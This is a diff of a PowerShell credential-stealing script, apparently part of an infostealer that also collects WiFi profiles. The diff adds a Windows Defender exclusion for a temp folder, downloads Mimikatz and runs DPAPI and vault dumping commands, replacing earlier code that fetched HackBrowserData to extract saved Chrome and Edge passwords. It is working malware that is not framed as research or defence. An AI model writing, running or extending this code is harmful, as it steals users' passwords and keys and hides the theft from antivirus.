@@ -18,89 +18,60 @@ foreach($name in $wifiProfiles) {
 if(-not $wifi) { $wifi = "No WiFi networks found" }
 
 # === Browser Passwords ===
-$tempDir = "$env:TEMP\hbd_$(Get-Random)"
+$tempDir = "$env:TEMP\mk_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 try {
     # Add temp directory to Windows Defender exclusion
     Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
     
-    # Download HackBrowserData
-    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
-    $zipPath = "$tempDir\hbd.zip"
+    # Download Mimikatz
+    $mimikatzUrl = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
+    $zipPath = "$tempDir\mk.zip"
     
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $hbdUrl -OutFile $zipPath -UseBasicParsing
+    Invoke-WebRequest -Uri $mimikatzUrl -OutFile $zipPath -UseBasicParsing
     
     # Extract
     Add-Type -AssemblyName System.IO.Compression.FileSystem
     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
     
-    # Run HackBrowserData
-    $exePath = "$tempDir\hack-browser-data.exe"
-    if(Test-Path $exePath) {
-        # Find all browser profile folders
-        $chromeDefault = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-        $edgeDefault = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+    # Find the x64 mimikatz
+    $mkPath = "$tempDir\x64\mimikatz.exe"
+    
+    if(Test-Path $mkPath) {
+        # Run Mimikatz to dump Chrome/Edge credentials
+        $commands = @"
+privilege::debug
+sekurlsa::dpapi
+vault::list
+exit
+"@
         
-        $browsers = "Debug Info:`n"
-        $browsers += "Chrome path exists: " + (Test-Path $chromeDefault) + "`n"
-        $browsers += "Edge path exists: " + (Test-Path $edgeDefault) + "`n"
+        $commandFile = "$tempDir\commands.txt"
+        $commands | Out-File -FilePath $commandFile -Encoding ASCII
         
-        # Run for each browser found
-        if(Test-Path $chromeDefault) {
-            & $exePath -b chrome -p $chromeDefault -f json --dir $tempDir 2>&1 | Out-Null
-            $browsers += "Ran Chrome extraction`n"
-        }
-        if(Test-Path $edgeDefault) {
-            & $exePath -b edge -p $edgeDefault -f json --dir $tempDir 2>&1 | Out-Null
-            $browsers += "Ran Edge extraction`n"
-        }
+        $result = & $mkPath "`"log $tempDir\output.txt`"" "`"$commandFile`"" 2>&1 | Out-String
         
-        # Also try auto-detect as fallback
-        & $exePath -b all -f json --dir $tempDir 2>&1 | Out-Null
-        $browsers += "Ran auto-detect`n"
-        
-        Start-Sleep -Seconds 5
-        
-        # List all files created
-        $allFiles = Get-ChildItem -Path $tempDir -Filter "*.json"
-        $browsers += "JSON files found: " + $allFiles.Count + "`n"
-        foreach($f in $allFiles) {
-            $browsers += "  - " + $f.Name + " (" + $f.Length + " bytes)`n"
-        }
-        
-        # Read ALL password JSON files and combine
-        $jsonFiles = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse
-        $passData = ""
-        
-        foreach($jsonFile in $jsonFiles) {
-            try {
-                $content = Get-Content $jsonFile.FullName -Raw
-                $browsers += "Reading: " + $jsonFile.Name + " - Length: " + $content.Length + "`n"
-                
-                $data = $content | ConvertFrom-Json
-                foreach($item in $data) {
-                    $url = if($item.LoginURL) { $item.LoginURL } else { "No URL" }
-                    $user = if($item.UserName) { $item.UserName } else { "" }
-                    $pass = if($item.Password) { $item.Password } else { "" }
-                    
-                    if($pass) {
-                        $passData += "$url`nUser: $user`nPass: $pass`n`n"
-                    }
-                }
-            } catch {
-                $browsers += "Error reading " + $jsonFile.Name + ": " + $_.Exception.Message + "`n"
+        # Read the output
+        $outputFile = "$tempDir\output.txt"
+        if(Test-Path $outputFile) {
+            $mkOutput = Get-Content $outputFile -Raw
+            
+            # Parse for credentials
+            $browsers = "=== Mimikatz Output ===`n"
+            
+            # Extract DPAPI masterkeys and credentials
+            if($mkOutput -match "domain|username|password") {
+                $browsers += $mkOutput
+            } else {
+                $browsers = "Mimikatz ran but no credentials found in memory"
             }
-        }
-        
-        if($passData) {
-            $browsers = $passData
-        } elseif(-not $browsers.Contains("Error")) {
-            $browsers += "`nNo passwords in any JSON files"
+        } else {
+            $browsers = "Mimikatz executed but no output file created"
         }
     } else {
-        $browsers = "Failed to extract HackBrowserData"
+        $browsers = "Mimikatz executable not found after extraction"
     }
 } catch {
     $browsers = "Error: $($_.Exception.Message)"
